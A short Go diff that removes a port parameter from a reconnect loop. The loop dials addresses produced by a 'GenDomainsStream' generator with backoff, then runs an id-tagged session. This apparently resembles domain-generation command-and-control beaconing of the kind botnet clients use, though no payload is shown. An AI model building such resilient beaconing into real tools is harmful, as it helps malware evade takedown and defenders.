@@ -51,7 +51,7 @@ func main() {
     rand.Seed(time.Now().UnixNano())
 
     for {
-        conn, picked := dialWithBackoff(9002)
+        conn, picked := dialWithBackoff()
         log.Printf("connected to %s", picked)
 
         if err := runSession(*id, conn); err != nil {
@@ -65,13 +65,13 @@ func main() {
     }
 }
 
-func dialWithBackoff(port int) (net.Conn, string) {
+func dialWithBackoff() (net.Conn, string) {
     attempt := 0
     backoff := 1 * time.Second
     maxBackoff := 30 * time.Second
 
     for {
-        for addr := range u.GenDomainsStream(23, 16, port) {
+        for addr := range u.GenDomainsStream(23, 16) {
             attempt++
             conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
             if err == nil {
